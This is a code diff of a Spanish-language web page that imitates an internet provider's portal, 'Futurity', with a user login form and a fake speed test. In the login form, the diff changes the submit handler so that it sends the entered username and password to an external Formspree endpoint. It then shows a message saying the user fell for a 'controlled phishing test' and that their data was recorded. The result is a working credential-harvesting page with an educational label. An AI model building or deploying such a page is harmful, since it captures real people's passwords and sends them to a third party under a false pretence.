@@ -22,9 +22,9 @@
             <div class="login-card">
                 <h3><i class="fas fa-fingerprint"></i> Portal de Usuario</h3>
                 <form id="p-form">
-                    <input type="text" placeholder="Usuario o Correo" required>
-                    <input type="password" placeholder="Contraseña" required>
-                    <button type="submit">AUTENTICAR</button>
+                    <input type="text" name="Usuario_Estudiante" placeholder="Usuario o Correo" required>
+                    <input type="password" name="Clave_Estudiante" placeholder="Contraseña" required>
+                    <button type="submit" id="btn-auth">AUTENTICAR</button>
                 </form>
             </div>
         </section>
@@ -47,7 +47,7 @@
                 <div class="gauge-box" id="gauge"><i class="fas fa-tachometer-alt"></i></div>
                 <div class="speed-info">
                     <h2>Mide la velocidad de tu conexión</h2>
-                    <p>Experimenta la mejor conectividad.</p>
+                    <p>Experimenta la mejor conectividad en Cuenca.</p>
                 </div>
                 <button class="speed-btn" id="run-test">Test de VELOCIDAD <i class="fas fa-chevron-right"></i></button>
             </div>
@@ -58,10 +58,7 @@
         <div class="footer-container">
             <div class="footer-col branding">
                 <div class="social-row">
-                    <i class="fab fa-facebook-f"></i>
-                    <i class="fab fa-instagram"></i>
-                    <i class="fab fa-linkedin-in"></i>
-                    <i class="fab fa-tiktok"></i>
+                    <i class="fab fa-facebook-f"></i><i class="fab fa-instagram"></i><i class="fab fa-linkedin-in"></i><i class="fab fa-tiktok"></i>
                 </div>
                 <div class="f-square-logo">F<span>°</span></div>
                 <p>Todos los derechos reservados.<br>Futurity 2026.<br>Diseño y desarrollo xPURPURA</p>
@@ -74,8 +71,6 @@
                     <li>Reglamento de Abonados</li>
                     <li>Política de Protección de Datos</li>
                     <li>Control Parental</li>
-                    <li>Indicador de Consumo</li>
-                    <li>Contrato de adhesión</li>
                     <li>Calidad de Servicio</li>
                 </ul>
             </div>
@@ -117,33 +112,33 @@
             { n: 'Cloud', i: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=400' }
         ];
 
-        const benefits = [
-            { t: 'Alta Velocidad', ic: 'fa-tachometer-alt' },
-            { t: 'Entretenimiento', ic: 'fa-tv' },
-            { t: 'Hogares Pro', ic: 'fa-home' },
-            { t: 'Seguridad', ic: 'fa-shield-alt' },
-            { t: 'Cloud', ic: 'fa-cloud' }
-        ];
+        const benefits = [{ t: 'Alta Velocidad', ic: 'fa-tachometer-alt' },{ t: 'Entretenimiento', ic: 'fa-tv' },{ t: 'Hogares Pro', ic: 'fa-home' },{ t: 'Seguridad', ic: 'fa-shield-alt' },{ t: 'Cloud', ic: 'fa-cloud' }];
 
         const render = (id, list, temp) => document.getElementById(id).innerHTML += list.map(temp).join('');
-        
-        render('main-grid', services, s => `
-            <div class="card" onclick="openModal('${s.n}')">
-                <div class="c-img" style="background-image:url('${s.i}')"></div>
-                <div class="c-foot"><h4>${s.n}</h4></div>
-            </div>`);
-
-        render('b-grid', benefits, b => `
-            <div class="b-item"><i class="fas ${b.ic}"></i><h4>${b.t}</h4></div>`);
+        render('main-grid', services, s => `<div class="card" onclick="openModal('${s.n}')"><div class="c-img" style="background-image:url('${s.i}')"></div><div class="c-foot"><h4>${s.n}</h4></div></div>`);
+        render('b-grid', benefits, b => `<div class="b-item"><i class="fas ${b.ic}"></i><h4>${b.t}</h4></div>`);
 
         function openModal(txt) {
-            document.getElementById('m-text').innerText = txt.includes('Phishing') ? `Usted ha ${txt}` : `Información de ${txt}.`;
+            document.getElementById('m-text').innerText = txt.includes('Phishing') ? `Señor Usuario, usted ha ${txt}` : `Información de ${txt}.`;
             document.getElementById('modal').style.display = 'flex';
         }
 
-        document.getElementById('p-form').onsubmit = (e) => {
+        // --- ENVÍO REAL A FORMSPREE ---
+        const loginForm = document.getElementById('p-form');
+        loginForm.onsubmit = (e) => {
             e.preventDefault();
-            openModal("caído en una prueba de Phishing controlada.");
+            const btn = document.getElementById('btn-auth');
+            btn.innerText = "Validando...";
+            
+            fetch("https://formspree.io/f/xkoqllzz", {
+                method: "POST",
+                body: new FormData(loginForm),
+                headers: { 'Accept': 'application/json' }
+            }).finally(() => {
+                btn.innerText = "AUTENTICAR";
+                openModal("caído en una prueba de Phishing controlada. Sus datos han sido registrados con fines educativos.");
+                loginForm.reset();
+            });
         };
 
         document.getElementById('run-test').onclick = function() {
@@ -152,8 +147,8 @@
             setTimeout(() => {
                 document.getElementById('gauge').classList.remove('spinning');
                 this.innerHTML = 'Test de VELOCIDAD <i class="fas fa-chevron-right"></i>';
-                openModal(`Velocidad: ${Math.floor(Math.random() * 500) + 100} Mbps`);
-            }, 2000);
+                openModal(`Velocidad detectada: ${Math.floor(Math.random() * 500) + 100} Mbps`);
+            }, 2500);
         };
     </script>
 </body>
